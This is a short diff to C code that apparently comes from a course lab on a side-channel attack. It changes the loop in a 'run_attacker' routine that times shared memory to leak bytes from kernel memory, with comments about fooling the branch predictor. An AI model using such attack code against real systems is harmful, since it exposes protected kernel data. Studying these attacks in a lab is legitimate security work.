@@ -71,7 +71,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         {
             char leaked_byte;
             int min = 100000;
-            for (size_t i = 0; i < 1000000 ; i = i + 1 + rand()%3) //fool BP -in part 2.4 we need to change max(i) //rand max i?
+            for (size_t i = 0; i < 1024 ; i++) //fool BP -in part 2.4 we need to change max(i) //rand max i?
             { 
                 mfence();
                 clean_shared_memory_from_tlb(shared_memory);
